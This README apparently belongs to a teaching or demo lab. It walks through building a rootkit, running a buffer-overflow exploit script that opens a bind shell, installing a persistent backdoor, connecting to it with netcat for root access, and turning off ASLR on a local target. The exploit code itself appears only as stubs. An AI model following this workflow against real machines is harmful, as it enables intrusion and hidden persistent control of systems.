# Rootkit Project

## Project Layout

`rootkit/` - source code for malicious rootkit library 
`dropper/` - exploit code
`target/` - target environment (run on target server)

## Overview

This readme details the process for setting up your test environment, and installing your malware using an exploit script.

In order to do install, you will run an exploit script which will exploit a buffer overflow in the target process.
This will open up a temporary bind shell into the process which the exploit script will use to install the rootkit on the target machine.

For a copy of these instructions see https://mw-demo.roryhemmings.com

## Exploitation

**Perform these steps in the *dropper/* directory**
They can be done on any linux machine with this repo downloaded.

Before doing so, message me with your rootkit tarball so I can host it for you on my static webserver.

This tarball can be created by running the following commands in the ***rootkit/* directory**

```sh
make
make dist
```

### Steps
1. Update the target number (this will be assigned to you) in exploit.py and backdoor.sh

exploit.py
```py
'''
Set the below target number to your assigned target number to automate the installation process
'''
target_num = #

# ---------------------------------
...
```

backdoor.sh
```sh
#!/bin/bash

TARGET_NUM=#
...
```

2. Run your exploit
```sh
python3 exploit.py
```

3. Open the backdoor
```sh
chmod +x backdoor.sh        # give exec perms if you haven't already
./backdoor.sh
```

This will prompt you for a password. You can leave it blank as the backdoor has already been opened.

4. Connect to your persistent backdoor (in another terminal window)
```sh
nc mw-demo.roryhemmings.com PORT
```

In this case, replace the `PORT` with your assigned backdoor port
After doing this you will have root access to the machine, and you can do whatever you want.

For example, if you go the link `http://mw-demo.roryhemmings.com:WEB_PORT` where `WEB_PORT` is your assigned web port, it will take you the static site hosted by your machine.

The static files served by this machine are in `/var/www/html` if you would like to modify them. However, keep in mind, you don't have access to any text editors, so you will likely have to use shell commands like echo.

## Target Environment Setup (optional)

Only perform these steps if you would like to test your rootkit locally.

Perform all these steps in the vm in the ***target/* directory**

1. install docker

```sh
curl -fsSL https://get.docker.com -o get-docker.sh
sh get-docker.sh

sudo apt install docker-compose
```

2. disable aslr

```sh
sudo echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

3. run `sudo make setup`

after doing so, you can run `sudo make shell` to open a shell in the docker container, or `sudo make clean` to take down the target environment.